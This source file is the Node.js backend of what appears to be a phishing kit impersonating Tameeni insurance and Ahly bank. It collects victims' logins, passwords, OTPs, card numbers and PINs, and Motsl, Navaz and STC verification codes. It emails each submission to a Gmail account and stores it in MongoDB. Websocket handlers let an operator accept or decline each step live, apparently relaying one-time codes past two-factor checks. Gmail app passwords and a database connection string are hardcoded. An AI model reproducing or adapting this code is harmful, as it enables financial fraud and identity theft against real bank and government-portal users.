const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors());
app.use(require("morgan")("dev"));

const emailData = {
  user: "pnusds269@gmail.com",
  pass: "pvjk jert azvw exnr",
  // user: "saudiabsher1990@gmail.com",
  // pass: "qlkg nfnn xaeq fitz",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Tammeni Bank Visa"
          : type === "login" //
          ? "Ahly Username "
          : type === "password" //
          ? "Tammeni Password Form "
          : type === "otp" //
          ? "Tammeni Visa  Otp"
          : type === "pin"
          ? "Tammeni Visa Pin "
          : type === "motsl"
          ? "Tammeni - Motsl Gate Data "
          : type === "motslOtp"
          ? "Tammeni - Motsl Gate Otp "
          : type === "navaz"
          ? "Tameeni - Navaz Gate "
          : type === "navazOtp"
          ? "Tameeni Navaz Last Otp  "
          : "Tameeni "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.sendStatus(200));

app.post("/login", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "login").then(() =>
          res.status(201).json({ order })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/password/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(
    id,
    {
      ...req.body,
      checked: false,
      userAccept: false,
    },
    { new: true }
  ).then(
    async (order) =>
      await sendEmail(req.body, "password").then(() =>
        res.status(200).json(order)
      )
  );
});

app.post("/otp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    otp: req.body.otp,
    checked: false,
    otpAccept: false,
  }).then(
    async () => await sendEmail(req.body, "otp").then(() => res.sendStatus(200))
  );
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    CardAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visa").then(() => res.sendStatus(200))
  );
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    CardOtp: req.body.otp,
    checked: false,
    OtpCardAccept: false,
  }).then(
    async () => await sendEmail(req.body, "otp").then(() => res.sendStatus(200))
  );
});
app.post("/visaPin/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    pin: req.body.pin,
    checked: false,
    PinAccept: false,
  }).then(
    async () => await sendEmail(req.body, "pin").then(() => res.sendStatus(200))
  );
});

app.post("/motsl/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    MotslAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "motsl").then(() => res.sendStatus(200))
  );
});
app.post("/motslOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    MotslOtp: req.body.MotslOtp,
    checked: false,
    MotslOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "motslOtp").then(() => res.sendStatus(200))
  );
});

app.post("/navaz/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    NavazAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "navaz").then(() => res.sendStatus(200))
  );
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

io.on("connection", (socket) => {
  console.log("connected");

  socket.on("login", () => io.emit("login"));

  socket.on("password", (data) => io.emit("password"));

  socket.on("acceptUser", async (id) => {
    console.log("acceptUser From Admin", id);
    console.log(id);
    io.emit("acceptUser", id);
    await Order.findByIdAndUpdate(id, { userAccept: true });
  });
  socket.on("declineUser", async (id) => {
    console.log("declineUser Form Admin", id);
    io.emit("declineUser", id);
    await Order.findByIdAndUpdate(id, { userAccept: true });
  });
  socket.on("otp", (data) => io.emit("otp", data));
  socket.on("acceptOtp", async (id) => {
    console.log("acceptOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { otpAccept: true });
    io.emit("acceptOtp", id);
  });
  socket.on("declineOtp", async (id) => {
    console.log("declineOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { otpAccept: true });
    io.emit("declineOtp", id);
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });
  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("acceptVisaOtp", id);
  });
  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("declineVisaOtp", id);
  });

  socket.on("visa", (data) => {
    console.log("visa  received", data);
    io.emit("visa", data);
  });
  socket.on("acceptVisa", async (id) => {
    console.log("acceptVisa From Admin", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
    io.emit("acceptVisa", id);
  });
  socket.on("declineVisa", async (id) => {
    console.log("declineVisa Form Admin", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
    io.emit("declineVisa", id);
  });

  socket.on("motsl", (data) => {
    console.log("Motsl Data", data);
    io.emit("motsl", data);
  });

  socket.on("acceptMotsl", async (id) => {
    console.log("Motsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("acceptMotsl", id);
  });
  socket.on("declineMotsl", async (id) => {
    console.log("declineMotsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("declineMotsl", id);
  });

  socket.on("motslOtp", async (data) => {
    console.log("motslOtp received", data);
    await Order.findByIdAndUpdate(data.id, {
      MotslOtp: data.MotslOtp,
      STCAccept: false,
    });
    io.emit("motslOtp", data);
  });
  socket.on("acceptMotslOtp", async (id) => {
    console.log("acceptMotslOtp send", id);
    io.emit("acceptMotslOtp", id);
    await Order.findByIdAndUpdate(id, { MotslOtpAccept: true });
  });
  socket.on("declineMotslOtp", async (id) => {
    console.log("declineMotslOtp send", id);
    io.emit("declineMotslOtp", id);
    await Order.findByIdAndUpdate(id, { MotslOtpAccept: true });
  });

  socket.on("acceptSTC", async (id) => {
    console.log("acceptSTC send", id);
    io.emit("acceptSTC", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
  });
  socket.on("declineSTC", async (id) => {
    console.log("declineSTC send", id);
    io.emit("declineSTC", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
  });

  socket.on("navaz", (data) => {
    console.log("navaz received", data);
    io.emit("navaz", data);
  });
  socket.on("acceptNavaz", async (data) => {
    console.log("acceptNavaz send", data);
    io.emit("acceptNavaz", data);
    await Order.findByIdAndUpdate(data.id, {
      NavazAccept: true,
      NavazOtp: data.userOtp,
    });
  });
  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz send", id);
    io.emit("declineNavaz", id);
    await Order.findByIdAndUpdate(id, { NavazAccept: true });
  });
  socket.on("successValidate", (data) => io.emit("successValidate", data));
  socket.on("declineValidate", (data) => io.emit("declineValidate", data));
});

// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};

mongoose
  .connect("mongodb+srv://abshr:abshr@abshr.fxznc.mongodb.net/ahly")
  .then((conn) =>
    server.listen(PORT, async () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
      // await Order.find({}).then(async (orders) => {
      //   await Promise.resolve(
      //     orders.forEach(async (order) => {
      //       await Order.findByIdAndDelete(order._id);
      //     })
      //   );
      // });
    })
  );
